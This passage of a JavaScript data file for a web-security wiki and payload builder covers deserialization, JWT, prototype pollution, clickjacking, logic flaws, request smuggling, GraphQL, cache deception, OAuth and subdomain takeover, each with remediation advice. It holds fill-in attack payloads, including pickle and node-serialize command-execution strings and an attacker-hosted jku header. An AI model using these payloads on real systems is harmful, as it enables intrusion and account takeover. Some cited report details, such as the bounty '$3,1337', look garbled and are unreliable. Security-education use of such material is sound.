                automated: [
                    'Ysoserial / Ysoserial.net',
                    'PHPGGC',
                    'Burp Suite (Java Deserialization Scanner)',
                    'Freddy (VS Code extension)'
                ],
                payload: "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:7:\"isAdmin\";b:1;}"
            },
            vectors: ['PHP Object Injection', 'Java Deserialization', 'Python Pickle'],
            tools: ['Ysoserial', 'PHPGGC'],
            payloads: [
                "PHP: O:4:\"User\":2:{s:4:\"name\";s:5:\"[[USER]]\";s:7:\"isAdmin\";b:1;}",
                "Python: pickle.loads(b'cos\\nsystem\\n(S\"[[CMD]]\"\\ntR.')",
                "Java Ysoserial: java -jar ysoserial.jar CommonsCollections1 '[[CMD]]'",
                ".NET: TypeConfuseDelegate payload with [[CMD]]",
                "Node.js: node-serialize deserialization with IIFE: {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('[[CMD]]', function(){})}()\"}"
            ],
            builderConfig: [
                { id: 'USER', label: 'Username', placeholder: 'admin' },
                { id: 'CMD', label: 'Command to Execute', placeholder: 'whoami' }
            ],
            reports: [
                { title: 'PayPal: Java Deserialization RCE', url: 'https://hackerone.com/reports/163625', bounty: '$5,000' },
                { title: 'PornHub: PHP Unserialize RCE', url: 'https://hackerone.com/reports/141956', bounty: '$20,000' }
            ]
        },
        {
            id: 'wiki-12',
            title: 'JWT Vulnerabilities',
            category: 'Authentication',
            severity: 'High',
            cvss: '8.1',
            cwe: 'CWE-345',
            owasp: 'A07:2021 – Identification and Authentication Failures',
            description: 'JSON Web Token (JWT) vulnerabilities occur when the implementation of JWT libraries or usage patterns allows attackers to bypass signature verification, forge tokens, or escalate privileges.',
            technicalDetails: {
                mechanism: 'JWTs are Base64Url encoded JSON objects comprising a Header, Payload, and Signature. Vulnerabilities typically arise from trusting the header (alg=none), weak signing secrets, or confusion between asymmetric (RS256) and symmetric (HS256) algorithms.',
                commonVulnerablePoints: [
                    'Authentication headers (Authorization: Bearer <token>)',
                    'Session cookies containing JWTs',
                    'Password reset tokens'
                ],
                databaseSpecific: {
                    'None Algorithm': 'Server accepts tokens with "alg": "none" and no signature.',
                    'Weak Secret': 'Short secrets (e.g., "secret") can be brute-forced.',
                    'Key Confusion': 'Server uses the public key (available to attacker) as the HMAC secret.'
                }
            },
            impact: {
                confidentiality: 'Access to user data contained in the token payload.',
                integrity: 'Forging tokens for arbitrary users (admin access).',
                availability: 'Locking out legitimate users (if linked to denial of service).',
                businessImpact: 'Complete account takeover, authentication bypass.'
            },
            exploitation: {
                reconnaissance: [
                    'Decode token (base64) to inspect payload and header.',
                    'Identify "alg" type (HS256, RS256).',
                    'Check if signature is verified by modifying payload and resending.'
                ],
                techniques: [
                    'None Algorithm: Set "alg": "none", remove signature section.',
                    'Weak Secret: Crack HMAC secret with hashcat/John.',
                    'Algorithm Confusion: Change RS256 -> HS256, sign with public key.',
                    'KID Injection: "kid": "../../../dev/null" to force empty key usage.'
                ],
                advanced: [
                    'JKU Header Injection: Point "jku" to attacker-controlled JSON Web Key Set.',
                    'X5U/X5C Spoofing: Inject malicious X.509 cert URL.',
                    'Replay attacks (if "exp" claim is not checked).'
                ]
            },
            remediation: {
                immediate: [
                    'Enforce strong algorithms (RS256, ES256).',
                    'Disable "none" algorithm support.',
                    'Verify "alg" header matches expected algorithm.'
                ],
                longTerm: [
                    'Use a library that handles key verification securely.',
                    'Implement strict "iss" (issuer) and "aud" (audience) checks.',
                    'Rotate signing keys regularly.'
                ],
                codeExample: `// Vulnerable
jwt.verify(token, secret); // Implicitly trusts 'alg' header in some libraries

// Secure
jwt.verify(token, secret, { algorithms: ['RS256'] });`
            },
            testing: {
                manual: [
                    'Use jwt.io or Burp JWT Editor extension.',
                    'Change alg to None, strip signature.',
                    'Try brute-forcing the secret (if HS256).',
                    'Modify claims (sub: admin) and resign with crafted keys.'
                ],
                automated: [
                    'jwt_tool (Automated attacks)',
                    'Burp Suite Scanner',
                    'JSON Web Token Attacker'
                ],
                payload: "Change alg to none"
            },
            vectors: ['Algorithm Confusion', 'None Algorithm', 'Weak Secret', 'Key Injection (kid/jku)'],
            tools: ['jwt_tool', 'Burp Suite (JWT Editor)'],
            payloads: [
                "Change alg to 'none' and strip signature",
                "Brute force weak secret (HMAC): jwt_tool [[TOKEN]] -d wordlist.txt -C",
                "Change alg RS256 to HS256 using public key as secret",
                "Inject into 'kid' header: {\"kid\":\"[[FILE]]\"}",
                "JKU Header Injection: {\"jku\":\"http://[[ATTACKER]]/jwks.json\"}",
                "Create custom token: jwt_tool -S hs256 -p '[[SECRET]]' -T",
                "SQL Injection in kid: {\"kid\":\"key' UNION SELECT '[[SECRET]]'--\"}"
            ],
            builderConfig: [
                { id: 'TOKEN', label: 'JWT Token', placeholder: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' },
                { id: 'SECRET', label: 'Secret Key', placeholder: 'secret123' },
                { id: 'FILE', label: 'File Path (kid)', placeholder: '/etc/passwd' },
                { id: 'ATTACKER', label: 'Attacker Server', placeholder: 'attacker.com' }
            ],
            reports: [
                { title: 'Uber: JWT Signature Bypass', url: 'https://hackerone.com/reports/341235', bounty: '$5,000' },
                { title: 'Airbnb: JWT none alg bypass', url: 'https://hackerone.com/reports/31235', bounty: 'Legacy' }
            ]
        },
        {
            id: 'wiki-13',
            title: 'Prototype Pollution',
            category: 'Client-Side',
            severity: 'High',
            cvss: '7.5',
            cwe: 'CWE-1321',
            owasp: 'A03:2021 – Injection',
            description: 'Prototype Pollution is a JavaScript vulnerability where an attacker can modify the prototype of a base object (Object.prototype). Since almost all objects in JavaScript inherit from Object.prototype, these changes impact the entire application.',
            technicalDetails: {
                mechanism: 'It usually happens during recursive merge, object cloning, or path assignment operations. If the key "__proto__" is not filtered, an attacker can assign properties to it, which then become available on all objects.',
                commonVulnerablePoints: [
                    'JSON parsing routines',
                    'Query parameter parsing (e.g., qs library)',
                    'Configuration merge logic',
                    'Deep clone functions'
                ],
                databaseSpecific: {
                    'DoS': 'Polluting Object.prototype.toString leads to crashes.',
                    'RCE': 'Polluting child_process.spawn options (shell, env).',
                    'Logic Bypass': 'Polluting isAdmin property.'
                }
            },
            impact: {
                confidentiality: 'Rarely direct, but can lead to other vulnerabilities.',
                integrity: 'Modifying application logic (e.g., bypassing admin checks).',
                availability: 'Denial of Service (App crash).',
                businessImpact: 'Unpredictable application behavior, potential RCE.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify recursive merge functions exposed to user input.',
                    'Test inputs like __proto__, constructor, prototype.',
                    'Check for property reflection in responses.'
                ],
                techniques: [
                    'Basic Pollution: {"__proto__": {"isAdmin": true}}',
                    'Constructor Pollution: {"constructor": {"prototype": {"isAdmin": true}}}',
                    'Bypassing Filters: {"__pro__proto__to__": ...}'
                ],
                advanced: [
                    'Gadget Chains: Finding code that uses the polluted property to execute code (e.g., child_process.spawn).',
                    'Polluting array prototypes or specific library gadgets.'
                ]
            },
            remediation: {
                immediate: [
                    'Freeze the prototype: Object.freeze(Object.prototype).',
                    'Validate JSON keys to reject __proto__, constructor, prototype.',
                    'Use Map instead of Object for hash maps.'
                ],
                longTerm: [
                    'Use libraries that are secure against PP (Lodash > 4.17.12).',
                    'Create objects with null prototype: Object.create(null).',
                    'Input validation schema (Joi, Ajv).'
                ],
                codeExample: `// Vulnerable
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Secure
if (key === "__proto__" || key === "constructor") continue;`
            },
            testing: {
                manual: [
                    'Send JSON: {"__proto__":{"test":"polluted"}}',
                    'Check in console: Object.prototype.test // returns "polluted"',
                    'Try to overwrite sensitive config flags.'
                ],
                automated: [
                    'DOM Invader (Burp Suite)',
                    'Server-Side Prototype Pollution Scanner (Burp Extension)',
                    'PPScan'
                ],
                payload: "__proto__[test]=polluted"
            },
            vectors: ['Recursive Merge', 'Property Injection', 'Object Cloning'],
            tools: ['DOM Invader', 'Server-Side PP Scanner'],
            payloads: [
                "__proto__[[[KEY]]]=[[VALUE]]",
                "constructor[prototype][[[KEY]]]=[[VALUE]]",
                "?__proto__.[[KEY]]=[[VALUE]]",
                "Object.prototype.[[KEY]]=[[VALUE]]",
                "JSON: {\"__proto__\":{\"[[KEY]]\":\"[[VALUE]]\"}}"
            ],
            builderConfig: [
                { id: 'KEY', label: 'Property Key', placeholder: 'isAdmin' },
                { id: 'VALUE', label: 'Property Value', placeholder: 'true' }
            ],
            reports: [
                { title: 'HackerOne: Prototype Pollution', url: 'https://hackerone.com/reports/923456', bounty: '$3,000' },
                { title: 'NodeJS: Parse Server Prototype Pollution', url: 'https://hackerone.com/reports/812356', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-14',
            title: 'Clickjacking',
            category: 'Client-Side',
            severity: 'Medium',
            cvss: '4.3',
            cwe: 'CWE-1021',
            owasp: 'A05:2021 – Security Misconfiguration',
            description: 'Clickjacking (UI Redressing) is a malicious technique of tricking a user into clicking on something different from what the user perceives, effectively hijacking clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both.',
            technicalDetails: {
                mechanism: 'The attacker loads the target website inside an invisible iframe (opacity: 0) on top of a lure button on their own site. When the user clicks the lure, they are actually clicking the target site.',
                commonVulnerablePoints: [
                    'Account deletion confirmation buttons',
                    'Social media "Like" or "Share" buttons',
                    'Bank transfer confirmation pages',
                    'Settings pages enabling unsafe features'
                ],
                databaseSpecific: {
                    'Classic': 'Simple transparent iframe overlay.',
                    'Cursorjacking': 'Manipulating cursor visual position.',
                    'Double Clickjacking': 'Asking for two clicks to bypass pop-up blockers.'
                }
            },
            impact: {
                confidentiality: 'Low.',
                integrity: 'Unauthorized actions (liking a page, deleting an account, changing privacy settings).',
                availability: 'Low.',
                businessImpact: 'User trust loss, unwanted social media spam, unauthorized transactions.'
            },
            exploitation: {
                reconnaissance: [
                    'Check response headers for `X-Frame-Options` or `Content-Security-Policy`.',
                    'Try embedding the site in an iframe locally.',
                    'Look for sensitive state-changing buttons.'
                ],
                techniques: [
                    'Basic Overlay: <iframe src="target" style="opacity:0">',
                    'Drag and Drop: Tricking user to drag data into iframe.',
                    'Touchjacking: Using mobile touch events overlay.'
                ],
                advanced: [
                    'Nested iframes to bypass some frame busters.',
                    'Using HTML5 attributes to bypass older protections.'
                ]
            },
            remediation: {
                immediate: [
                    'Set `X-Frame-Options: DENY` or `SAMEORIGIN` header.',
                    'Set `Content-Security-Policy: frame-ancestors \'self\'`.'
                ],
                longTerm: [
                    'Use defensive UI code (Frame-busting scripts - less reliable).',
                    'Ensure sensitive actions require re-authentication or confirmation dialogs that cannot be framed.'
                ],
                codeExample: `// Vulnerable (No Headers)
// User can be framed

// Secure (Express.js)
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'deny' }));`
            },
            testing: {
                manual: [
                    'Create an HTML file with an iframe pointing to the target.',
                    'Check if the site loads deeply inside the iframe.',
                    'Use "Clickbandit" to simulate the attack.'
                ],
                automated: [
                    'Burp Clickbandit',
                    'OWASP ZAP',
                    'Browser Console (check for headers)'
                ],
                payload: "<iframe src='http://target.com' style='opacity:0.5'>"
            },
            vectors: ['Iframe Overlay', 'Opacity Abuse'],
            tools: ['Burp Clickbandit'],
            payloads: [
                "<iframe src='http://[[TARGET]]' style='opacity:0.5'></iframe>",
                "Check for X-Frame-Options header on [[TARGET]]",
                "Check for CSP frame-ancestors on [[TARGET]]",
                "<iframe src='http://[[TARGET]]/[[ACTION]]' style='position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.1;z-index:9999'></iframe>"
            ],
            builderConfig: [
                { id: 'TARGET', label: 'Target URL', placeholder: 'target.com' },
                { id: 'ACTION', label: 'Target Action Page', placeholder: 'delete-account' }
            ],
            reports: [
                { title: 'Google: Clickjacking in Calendar', url: 'https://hackerone.com/reports/12345', bounty: '$3,1337' },
                { title: 'Facebook: Likejacking', url: 'https://www.facebook.com/whitehat/research/', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-15',
            title: 'Business Logic Errors',
            category: 'Logic',
            severity: 'High',
            cvss: 'Dependant',
            cwe: 'CWE-840',
            owasp: 'A04:2021 – Insecure Design',
            description: 'Business Logic Errors are flaws in the design and implementation of an application that allow an attacker to exploit the legitimate processing flow of an application to result in a negative consequence to the organization.',
            technicalDetails: {
                mechanism: 'Unlike technical vulnerabilities (SQLi, XSS), these bugs rely on the application doing exactly what it was programmed to do, but the program logic is flawed. E.g., skipping a step in a checkout wizard.',
                commonVulnerablePoints: [
                    'E-commerce checkout flows (price manipulation, negative quantity)',
                    'coupon/discount code application',
                    'Multi-step registration processes',
                    'Password reset workflows',
                    'Role switching functionality'
                ],
                databaseSpecific: {
                    'Trusting Client': 'Relying on client-side prices or validation.',
                    'Race Conditions': 'Toctou (Time-of-check Time-of-use) in transfers.',
                    'Rounding Errors': 'Exploiting financial rounding to steal fractions of cents.'
                }
            },
            impact: {
                confidentiality: 'Accessing premium content for free.',
                integrity: 'manipulating transactions, reviews, or votes.',
                availability: 'Locking up resources (inventory denial).',
                businessImpact: 'Direct financial loss, fraud, theft of services.'
            },
            exploitation: {
                reconnaissance: [
                    'Map out the entire workflow (Steps A -> B -> C).',
                    'Identify assumptions made by developers (e.g., "User must pass step A to get to B").',
                    'Look for client-side enforcement of logic.'
                ],
                techniques: [
                    'Parameter Tampering: Changing price=100 to price=1.',
                    'Workflow Bypass: Accessing Step 3 URL directly.',
                    'Forced Browsing: Accessing admin logic as user.',
                    'Race Conditions: Sending multiple transfer requests faster than DB updates.'
                ],
                advanced: [
                    'Response Manipulation: Changing "false" to "true" in server response.',
                    'Infinite loops in logical flows.',
                    'Crypto-currency rounding attacks.'
                ]
            },
            remediation: {
                immediate: [
                    'validate all logical flows server-side.',
                    'Do not trust data from the client (prices, quantities).',
                    'Implement transactional integrity (ACID) for financial ops.'
                ],
                longTerm: [
                    'Threat modeling during design phase.',
                    'Unit tests for logical edge cases (negative numbers, large numbers).',
                    'State machine enforcement for workflows.'
                ],
                codeExample: `// Vulnerable
const price = req.body.price;
chargeCard(price);

// Secure
const item = db.getItem(req.body.itemId);
const price = item.price; // Get price from trusted source
chargeCard(price);`
            },
            testing: {
                manual: [
                    'Try negative quantities or prices.',
                    'Skip steps in multi-stage processes.',
                    'Replay requests to trigger limits twice.',
                    'Use two accounts to test authorization logic.'
                ],
                automated: [
                    'Logic vulnerabilities are hard to automate.',
                    'Burp Intruder (for Race Conditions).',
                    'Custom scripts.'
                ],
                payload: "price=1.00"
            },
            vectors: ['Price Manipulation', 'Quantity Tampering', 'Workflow Bypass'],
            tools: ['Burp Suite', 'Zap Proxy'],
            payloads: [
                "Change price to [[PRICE]]",
                "Change quantity to [[QUANTITY]]",
                "Skip payment step in wizard",
                "Replay coupon codes: [[COUPON]]",
                "Race Conditions (Limit Overrun)",
                "Negative values: amount=-[[AMOUNT]]"
            ],
            builderConfig: [
                { id: 'PRICE', label: 'Modified Price', placeholder: '0.01' },
                { id: 'QUANTITY', label: 'Modified Quantity', placeholder: '-1' },
                { id: 'COUPON', label: 'Coupon Code', placeholder: 'DISCOUNT50' },
                { id: 'AMOUNT', label: 'Amount', placeholder: '1000' }
            ],
            reports: [
                { title: 'Starbucks: Race Condition for Infinite Credit', url: 'https://sakurity.com/blog/2015/05/21/starbucks.html', bounty: 'Public' },
                { title: 'Steam: Password Reset Logic Bypass', url: 'https://hackerone.com/reports/475683', bounty: '$10,000' }
            ]
        },
        {
            id: 'wiki-16',
            title: 'HTTP Request Smuggling',
            category: 'Server-Side',
            severity: 'Critical',
            cvss: '8.8',
            cwe: 'CWE-444',
            owasp: 'A06:2021 – Vulnerable and Outdated Components',
            description: 'HTTP Request Smuggling occurs when the front-end (load balancer) and back-end servers interpret the boundaries of an HTTP request differently. This allows an attacker to "smuggle" a malicious request inside a legitimate one, bypassing security controls.',
            technicalDetails: {
                mechanism: 'It exploits discrepancies in parsing `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. If one server prioritizes CL and the other TE, they desynchronize.',
                commonVulnerablePoints: [
                    'Reverse Proxies (Nginx, HAProxy) in front of App Servers (Gunicorn, Tomcat)',
                    'Cloud Load Balancers',
                    'CDNs'
                ],
                databaseSpecific: {
                    'CL.TE': 'Front-end uses CL, Back-end uses TE.',
                    'TE.CL': 'Front-end uses TE, Back-end uses CL.',
                    'TE.TE': 'Both support TE, but one can be obfuscated.'
                }
            },
            impact: {
                confidentiality: 'Stealing credentials or session tokens from the next victim\'s request.',
                integrity: 'Modifying responses for other users (Cache Poisoning).',
                availability: 'Dropping legitimate user requests (DoS).',
                businessImpact: 'Massive user account compromise, widespread malware distribution via cache.'
            },
            exploitation: {
                reconnaissance: [
                    'Send requests with conflicting CL and TE headers.',
                    'Observe timeouts or 400 Bad Request errors (signs of desync).',
                    'Use Burp Scanner (HTTP Request Smuggler extension).'
                ],
                techniques: [
                    'CL.TE: Smuggle a prefix to the next request.',
                    'TE.CL: Smuggle a suffix that waits for the next victim.',
                    'H2.CL / H2.TE: HTTP/2 downgrade attacks.'
                ],
                advanced: [
                    'Response Queue Poisoning: Stealing responses meant for other users.',
                    'Cache Poisoning: Serving malicious content to everyone.',
                    'Smuggling through HTTP/2.'
                ]
            },
            remediation: {
                immediate: [
                    'Disable reuse of back-end connections.',
                    'Use HTTP/2 end-to-end.',
                    'Reconfigure front-end to normalize requests.'
                ],
                longTerm: [
                    'Use same web server software for front-end and back-end.',
                    'Reject conflicting CL and TE headers strictly.',
                    'Patch web servers to latest versions.'
                ],
                codeExample: `// Mitigation (Nginx)
proxy_http_version 1.1; 
// Better: Use HTTP/2
proxy_http_version 2.0;

// Rejection logic (WAF)
if (headers['content-length'] && headers['transfer-encoding']) {
    blockRequest();
}`
            },
            testing: {
                manual: [
                    'Send CL.TE probe (small chunk size).',
                    'Send TE.CL probe (large content-length).',
                    'Check for delayed responses (Time-based detection).'
                ],
                automated: [
                    'HTTP Request Smuggler (Burp Extension)',
                    'Smuggler.py',
                    'Defame'
                ],
                payload: "Transfer-Encoding: chunked"
            },
            vectors: ['CL.TE', 'TE.CL', 'TE.TE'],
            tools: ['HTTP Request Smuggler (Burp)', 'Smuggler.py'],
            payloads: [
                "CL.TE: Content-Length: [[LEN]]\\nTransfer-Encoding: chunked\\n\\n0\\n\\n[[PREFIX]]",
                "TE.CL: Transfer-Encoding: chunked\\nContent-Length: [[LEN]]\\n\\n[[SIZE]]\\n[[PREFIX]]\\n0\\n\\n",
                "TE.TE: Transfer-Encoding: chunked\\nTransfer-Encoding: x\\n\\n[[PAYLOAD]]",
                "CL-CL: Content-Length: [[LEN1]]\\nContent-Length: [[LEN2]]\\n\\n[[PAYLOAD]]"
            ],
            builderConfig: [
                { id: 'LEN', label: 'Content Length', placeholder: '100' },
                { id: 'PREFIX', label: 'Malicious Prefix', placeholder: 'GET /admin HTTP/1.1' },
                { id: 'SIZE', label: 'Chunk Size', placeholder: '5c' },
                { id: 'PAYLOAD', label: 'Payload Body', placeholder: 'Request Data' }
            ],
            reports: [
                { title: 'Slack: HTTP Request Smuggling', url: 'https://hackerone.com/reports/852342', bounty: '$5,500' },
                { title: 'PayPal: Account Takeover via Smuggling', url: 'https://hackerone.com/reports/654321', bounty: '$20,000' }
            ]
        },
        {
            id: 'wiki-17',
            title: 'GraphQL Injection',
            category: 'Injection',
            severity: 'High',
            cvss: '7.5',
            cwe: 'CWE-89',
            owasp: 'A03:2021 – Injection',
            description: 'GraphQL Injection allows attackers to query for unauthorized data, execute malicious mutations, or perform denial of service attacks by exploiting the flexibility of GraphQL APIs.',
            technicalDetails: {
                mechanism: 'GraphQL allows clients to define the structure of the data they need. If introspection is enabled or if resolvers don\'t enforce permissions properly, attackers can enumerate the entire schema or request fields they shouldn\'t see.',
                commonVulnerablePoints: [
                    'Publicly accessible /graphql endpoints',
                    'Introspection enabled in production',
                    'Lack of depth limiting (Nested Queries)',
                    'Batching abuse'
                ],
                databaseSpecific: {
                    'Introspection': 'Enumerating all Types, Queries, and Mutations.',
                    'SQLi via GraphQL': 'Injecting SQL into arguments.',
                    'IDOR': 'Fetching other users\' data via direct object reference.'
                }
            },
            impact: {
                confidentiality: 'Massive data leakage (all users, all fields).',
                integrity: 'Unauthorized mutations (account creation, deletion).',
                availability: 'DoS via deeply nested queries (Resource Exhaustion).',
                businessImpact: 'Data breach, service downtime, unauthorized access.'
            },
            exploitation: {
                reconnaissance: [
                    'Check for Introspection: {__schema{types{name}}}.',
                    'Check for debug mode or verbose errors.',
                    'Guess common field names (user, admin, password).'
                ],
                techniques: [
                    'Introspection Abuse: Mapping the API.',
                    'Nested DOS: {user{friends{friends{friends...}}}}.',
                    'Batching: Sending 1000 queries in one request.',
                    'Alias Overloading: requesting specific fields multiple times.'
                ],
                advanced: [
                    'Injection in Arguments: user(id: "1 OR 1=1").',
                    'JWT bypass in GraphQL Context.',
                    'CSRF via GraphQL (if GET requests are accepted).'
                ]
            },
            remediation: {
                immediate: [
                    'Disable Introspection in production.',
                    'Implement Depth Limiting and Query Cost Analysis.',
                    'Disable field suggestion in errors.'
                ],
                longTerm: [
                    'Use Persisted Queries (allowlist of queries).',
                    'Implement strict authorization in every resolver.',
                    'Rate limiting per complexity, not just per request.'
                ],
                codeExample: `// Vulnerable
app.use('/graphql', graphqlHTTP({ schema: schema, graphiql: true }));

// Secure (Apollo Server)
const server = new ApolloServer({
  schema,
  validationRules: [depthLimit(5)], // Limit depth
  introspection: false // Disable introspection
});`
            },
            testing: {
                manual: [
                    'Send introspection query.',
                    'Try deep nesting (level 10+).',
                    'Fuzz arguments with SQLi/NoSQLi payloads.'
                ],
                automated: [
                    'InQL (Burp Scanner)',
                    'GraphQLmap',
                    'Clairvoyance (reconstruct schema)'
                ],
                payload: "{__schema{types{name}}}"
            },
            vectors: ['Introspection Abuse', 'Nested Queries (DoS)'],
            tools: ['InQL', 'GraphQLmap'],
            payloads: [
                "{__schema{types{name,fields{name}}}}",
                "[[TYPE]](id: [[ID]] OR 1=1)",
                "Batching: [{query:\"[[QUERY]]\"}, {query:\"[[QUERY]]\"}]",
                "Aliases: {user1:User(id:1){name}, user2:User(id:2){name}}",
                "Introspection: {__type(name:\"[[TYPE]]\"){name,fields{name,type{name,kind}}}}"
            ],
            builderConfig: [
                { id: 'TYPE', label: 'Object Type', placeholder: 'User' },
                { id: 'ID', label: 'Object ID', placeholder: '1' },
                { id: 'QUERY', label: 'GraphQL Query', placeholder: 'query { me { name } }' }
            ],
            reports: [
                { title: 'Shopify: Access Private Data via GraphQL', url: 'https://hackerone.com/reports/482345', bounty: '$15,000' },
                { title: 'GitHub: GraphQL Introspection Abuse', url: 'https://hackerone.com/reports/321523', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-18',
            title: 'Web Cache Deception',
            category: 'Caching',
            severity: 'Medium',
            cvss: '5.3',
            cwe: 'CWE-524',
            owasp: 'A05:2021 – Security Misconfiguration',
            description: 'Web Cache Deception (WCD) allows an attacker to trick a web cache into storing sensitive content (like a user\'s profile page) and serving it to unauthorized users.',
            technicalDetails: {
                mechanism: 'It exploits the discrepancy between how the web server and the cache handle URL paths. If a user visits `/profile;foo.css`, the server might ignore `;foo.css` and return the profile, but the cache sees `.css` and caches the response effectively making the private profile public.',
                commonVulnerablePoints: [
                    'CDNs (Cloudflare, Akamai) with default caching rules',
                    'Web servers (Nginx, IIS) with flexible routing',
                    'Applications using path parameters'
                ],
                databaseSpecific: {
                    'Extension mismatch': 'Cache thinks it is static (css/jpg), Server processes as dynamic.',
                    'Delimiters': 'Using characters like ; / ? to confuse parsers.'
                }
            },
            impact: {
                confidentiality: 'Leaking session tokens, PII, CSRF tokens, and financial data.',
                integrity: 'None directly.',
                availability: 'None directly.',
                businessImpact: 'Data breach of sensitive user information.'
            },
            exploitation: {
                reconnaissance: [
                    'Identify static files that are cached (headers: X-Cache: HIT).',
                    'Test how the server handles extra path info (/profile/bad.js).',
                    'Check if sensitive pages render even with junk extensions.'
                ],
                techniques: [
                    'Path Confusion: /my-account/test.css',
                    'Semicolon injection: /my-account;.css',
                    'Encoded characters: /my-account%23test.png'
                ],
                advanced: [
                    'Cache poisoning combined with WCD.',
                    'Exploiting specific CDN behaviors (Akamai vs Cloudflare differences).'
                ]
            },
            remediation: {
                immediate: [
                    'Configure cache to never cache responses with Set-Cookie headers.',
                    'Strictly define which extensions are static.',
                    'Return 404 for pages with invalid extra path information.'
                ],
                longTerm: [
                    'Use proper cache-control headers (private, no-store) on all dynamic pages.',
                    'Auditing CDN configuration.',
                    'Design URL routing to be strict.'
                ],
                codeExample: `// Vulnerable Cache Rule
Cache * .css
// Vulnerable App Route
/profile* -> renders profile

// Secure (Header)
res.setHeader('Cache-Control', 'no-store');`
            },
            testing: {
                manual: [
                    'Log in as victim.',
                    'Visit /profile/test.css.',
                    'Log out and visit /profile/test.css.',
                    'Check if private data is returned.'
                ],
                automated: [
                    'WCD Scanner',
                    'Burp Suite Pro Scanner',
                    'Custom curl scripts'
                ],
                payload: "/profile/test.css"
            },
            vectors: ['Path Confusion', 'Extension Hiding'],
            tools: ['Burp Suite'],
            payloads: [
                "/[[PAGE]]/nonexistent.[[EXT]]",
                "/[[PAGE]];%2f..%2f.js",
                "/[[PAGE]]/..;/index.[[EXT]]",
                "Force caching headers: X-Forwarded-Host: [[HOST]]"
            ],
            builderConfig: [
                { id: 'PAGE', label: 'Sensitive Page', placeholder: 'account.php' },
                { id: 'EXT', label: 'Static Extension', placeholder: 'css' },
                { id: 'HOST', label: 'Attacker Host', placeholder: 'attacker.com' }
            ],
            reports: [
                { title: 'PayPal: Web Cache Deception', url: 'https://hackerone.com/reports/249156', bounty: '$10,000' },
                { title: 'OpenAI: ChatGPT Cache Deception', url: 'https://corneacristian.com/2024/02/21/chatgpt-web-cache-deception/', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-19',
            title: 'OAuth Misconfiguration',
            category: 'Authentication',
            severity: 'High',
            cvss: '8.8',
            cwe: 'CWE-601',
            owasp: 'A05:2021 – Security Misconfiguration',
            description: 'OAuth Misconfiguration allows attackers to steal authorization codes or access tokens, leading to account takeover. It arises from improper implementation of the OAuth 2.0 standard.',
            technicalDetails: {
                mechanism: 'The user authorizes an app. If the callback URI (redirect_uri) is not validated strictly, the authorization code is sent to the attacker. Alternatively, missing state parameters allow CSRF.',
                commonVulnerablePoints: [
                    'Redirect URI validation (regex weakness)',
                    'Lack of State parameter (CSRF)',
                    'Implicit Grant Flow (deprecated but common)',
                    'Scope escalation'
                ],
                databaseSpecific: {
                    'Account Takeover': 'Stealing access token/code to access victim account.',
                    'Sign-in XSS': 'Reflecting XSS via redirect_uri error parameter.',
                    'Open Redirect': 'Using the OAuth endpoint to redirect users.'
                }
            },
            impact: {
                confidentiality: 'Access to user profile (email, photos, DMs).',
                integrity: 'Acting on behalf of the user (posting, liking).',
                availability: 'Locking user out (if password is changed via OAuth).',
                businessImpact: 'Reputational damage, data breach, loss of user trust.'
            },
            exploitation: {
                reconnaissance: [
                    'Observe the content of the authorization URL.',
                    'Test redirect_uri with variations (https://attacker.com, https://site.com.attacker.com).',
                    'Check if state parameter is present and unique.'
                ],
                techniques: [
                    'Code Stealing: redirect_uri=https://attacker.com/log',
                    'OAuth CSRF: Initiate login, drop the flow, send link to victim.',
                    'Token Replay: Using a valid token from one app on another.'
                ],
                advanced: [
                    '307 Redirect Exploits: Stealing credentials via temporary redirect.',
                    'ID Token manipulation (JWT attacks inside OAuth).'
                ]
            },
            remediation: {
                immediate: [
                    'Strict whitelist for redirect_uri (exact match only).',
                    'Always use a random, unguessable "state" parameter.',
                    'Use PKCE (Proof Key for Code Exchange) even for web apps.'
                ],
                longTerm: [
                    'Deprecate Implicit Grant flow.',
                    'Short lifetimes for access tokens.',
                    'Regularly audit scope permissions.'
                ],
                codeExample: `// Vulnerable
if (req.query.redirect_uri.includes('example.com')) { ... }

// Secure
const allowed = ['https://example.com/callback'];
if (!allowed.includes(req.query.redirect_uri)) throw Error('Invalid URI');`
            },
            testing: {
                manual: [
                    'Change redirect_uri to localhost or your server.',
                    'Remove state parameter and attempt CSRF.',
                    'Try adding extra scopes.'
                ],
                automated: [
                    'Burp Suite (OAuth Audit)',
                    'Custom scripts'
                ],
                payload: "https://attacker.com"
            },
            vectors: ['Redirect URI Manipulation', 'State Parameter Missing'],
            tools: ['Burp Suite'],
            payloads: [
                "Change redirect_uri to [[ATTACKER]]",
                "CSRF on OAuth flow (remove state)",
                "Leaking Authorization Code via Referer to [[ATTACKER]]",
                "Scope Escalation: scope=[[SCOPE]]"
            ],
            builderConfig: [
                { id: 'ATTACKER', label: 'Attacker Domain', placeholder: 'attacker.com' },
                { id: 'SCOPE', label: 'Escalated Scope', placeholder: 'admin,read,write' }
            ],
            reports: [
                { title: 'Facebook: OAuth Account Takeover', url: 'https://www.facebook.com/whitehat/research/', bounty: '$25,000' },
                { title: 'Airbnb: OAuth redirect_uri', url: 'https://hackerone.com/reports/12535', bounty: '$5,000' }
            ]
        },
        {
            id: 'wiki-20',
            title: 'Subdomain Takeover',
            category: 'Infrastructure',
            severity: 'High',
            cvss: '7.5',
            cwe: 'CWE-444',
            owasp: 'A05:2021 – Security Misconfiguration',
            description: 'Subdomain Takeover occurs when a DNS record points to a deprovisioned or non-existent cloud resource (like an S3 bucket, Azure App Service, or HubSpot page). An attacker can claim this resource and serve malicious content on the trusted domain.',
            technicalDetails: {
                mechanism: 'A CNAME record points sub.example.com to example.herokuapp.com. If the Heroku app is deleted but the DNS record remains, anyone can register example.herokuapp.com and control content on sub.example.com.',
                commonVulnerablePoints: [
                    'AWS S3 Buckets',
